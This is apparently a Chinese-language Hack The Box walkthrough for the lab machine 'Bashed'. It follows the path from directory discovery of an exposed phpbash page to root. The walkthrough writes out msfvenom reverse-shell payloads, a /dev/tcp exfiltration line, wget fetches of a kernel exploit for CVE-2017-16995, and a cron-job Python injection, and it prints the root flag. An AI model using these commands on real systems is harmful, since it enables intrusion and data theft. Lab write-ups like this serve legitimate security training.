# Bashed
- URL : https://app.hackthebox.eu/machines/118
- IP : 10.129.209.72

## Recon
- Rustscan
    - ![](https://i.imgur.com/Gzn6aaI.png)
- Web
    - dirsearch 發現 `/dev/` 裡面有 phpbash
    - ![](https://i.imgur.com/CEV1y93.png)
## PHP Bash
- 可以直接用 `cat /etc/passwd` 指令
    - ![](https://i.imgur.com/Mn8RtoD.png)
## Reverse shell
- 直接戳習慣的 reverse shell 會自動離開
    - ![](https://i.imgur.com/UbQwxps.png)
- 改戳 msf 的 reverse shell
    - `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7877 -f elf > shell`
- 就順利接上了
    - ![](https://i.imgur.com/6EMqQL4.png)
- spawn shell
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
## 提權
- 起手式 sudo -l
    - ![](https://i.imgur.com/RGFg6i1.png)
    - 可以切換使用者到 `scriptmanager` 
    - `sudo -u scriptmanager bash`
    - ![](https://i.imgur.com/E54urqk.png)
- 跑 Linpeas 傳回來
    - cat s_peas.txt >  /dev/tcp/10.10.16.35/1234
- 使用 CVE-2017-16995 Kernel Exploit
    - ![](https://i.imgur.com/uLsG5BC.png)
    - `wget http://10.10.16.35/CVE-2017-16995/exploit`
    - ![](https://i.imgur.com/YFQAis2.png)
        - 成功提權
- 取得 Root Flag
    - `cc4f0afe3a1026d402ba10329674a8e2`
    - ![](https://i.imgur.com/k6UvzjE.png)
    - ![](https://i.imgur.com/JFxqKcf.png)
## 提權 2
- 觀察 `/scripts`
    - 裡面看起來 是 cronjob 跑 Python
    - ![](https://i.imgur.com/45ZNDR8.png)
- 用 msf 再生一個 reverse shell (跟目前不同 port)
    - `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7878 -f elf > shell1`
- 傳到靶機加權限
    - `wget 10.10.16.35/shell1`
    - `chmod 777 shell1`
- 寫入 cron job 的 py
    - `echo 'import os' >> test.py`
    - `echo 'os.system("/scripts/shell1")' >> test.py`
- 收到 Reverse shell
    - ![](https://i.imgur.com/0P5Pivo.png)
